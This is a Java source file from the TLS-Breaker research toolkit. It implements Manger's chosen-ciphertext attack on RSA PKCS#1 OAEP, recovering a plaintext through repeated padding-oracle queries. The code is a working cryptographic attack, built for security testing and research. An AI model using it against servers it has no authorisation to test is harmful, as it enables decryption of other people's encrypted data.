/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.attacks.pkcs1;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.util.MathHelper;
import de.rub.nds.tlsbreaker.attacks.pkcs1.oracles.Pkcs1Oracle;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.math.BigInteger;

/**
 * Manger algorithm according to https://www.iacr.org/archive/crypto2001/21390229.pdf Original Python code written by
 * Tibor Jager
 *
 * @version 0.1
 */
public class Manger extends Pkcs1Attack {

    private static final Logger LOGGER = LogManager.getLogger();

    /**
     *
     */
    protected Interval result;

    private volatile boolean interrupted = false;

    /**
     *
     * @param msg
     * @param pkcsOracle
     */
    public Manger(byte[] msg, Pkcs1Oracle pkcsOracle) {
        super(msg, pkcsOracle);
        // b computation
        int tmp = publicKey.getModulus().bitLength();
        tmp = (MathHelper.intCeilDiv(tmp, 8) - 1) * 8;
        bigB = BigInteger.ONE.shiftLeft(tmp);
        c0 = new BigInteger(1, encryptedMsg);
        LOGGER.debug("b: {}", ArrayConverter.bytesToHexString(bigB.toByteArray()));
    }

    /**
     *
     * @throws OracleException
     */
    public void attack() throws OracleException {
        BigInteger cc;

        LOGGER.debug("Step 0:  Ensuring that m in [0,B)");
        BigInteger fx = BigInteger.ONE;
        if (!queryOracle(c0, fx)) {
            BigInteger cx = c0;
            fx = fx.add(BigInteger.ONE);
            while (!interrupted) {
                cx = multiply(c0, fx);
                if (queryOracle(cx)) {
                    c0 = cx;
                    break;
                } else {
                    fx = fx.add(BigInteger.ONE);
                }
            }
        }

        LOGGER.debug("Ciphertext after step 0: {}", ArrayConverter.bytesToHexString(c0.toByteArray()));

        LOGGER.debug("Step 1");
        BigInteger f1 = new BigInteger("2");
        while (!interrupted) {
            cc = multiply(c0, f1);
            if (queryOracle(cc)) {
                f1 = f1.shiftLeft(1);
            } else {
                break;
            }
        }

        LOGGER.debug("Step 2");
        // f2 = int(intfloordiv(N+B,B)*f1/2)
        BigInteger tmp = MathHelper.intFloorDiv(publicKey.getModulus().add(bigB), bigB);
        BigInteger f2 = tmp.multiply(f1.shiftRight(1));
        while (!interrupted) {
            cc = multiply(c0, f2);
            if (!queryOracle(cc)) {
                f2 = f2.add(f1.shiftRight(1));
            } else {
                break;
            }
        }

        LOGGER.debug("Step 3");
        BigInteger mmin = MathHelper.intCeilDiv(publicKey.getModulus(), f2);
        BigInteger mmax = MathHelper.intFloorDiv(publicKey.getModulus().add(bigB), f2);

        result = new Interval(mmin, mmax);

        int prevIntervalSize = 0;
        while (!interrupted) {
            BigInteger ftmp = MathHelper.intFloorDiv(bigB.shiftLeft(1), mmax.subtract(mmin));
            BigInteger i = MathHelper.intFloorDiv(ftmp.multiply(mmin), publicKey.getModulus());
            BigInteger f3 = MathHelper.intCeilDiv(i.multiply(publicKey.getModulus()), mmin);
            cc = multiply(c0, f3);
            if (!queryOracle(cc)) {
                mmin = MathHelper.intCeilDiv(i.multiply(publicKey.getModulus()).add(bigB), f3);
            } else {
                mmax = MathHelper.intFloorDiv(i.multiply(publicKey.getModulus()).add(bigB), f3);
            }

            if (mmax.equals(mmin)) {
                break;
            }
        }

        if (!interrupted) {
            LOGGER.debug("Manger's attack solution (before inverse computation, if any): {}",
                ArrayConverter.bytesToHexString(mmin.toByteArray()));

            if (fx.equals(BigInteger.ONE)) {
                solution = mmin;
            } else {
                BigInteger inverse = fx.modInverse(publicKey.getModulus());
                solution = mmin.multiply(inverse).mod(publicKey.getModulus());
            }
            LOGGER.debug("Manger's attack solution (after inverse computation, if any): {}",
                ArrayConverter.bytesToHexString(solution.toByteArray()));
        }
    }

    /**
     *
     * @return
     */
    public boolean isInterrupted() {
        return interrupted;
    }

    /**
     *
     * @param interrupted
     */
    public void setInterrupted(boolean interrupted) {
        this.interrupted = interrupted;
    }
}
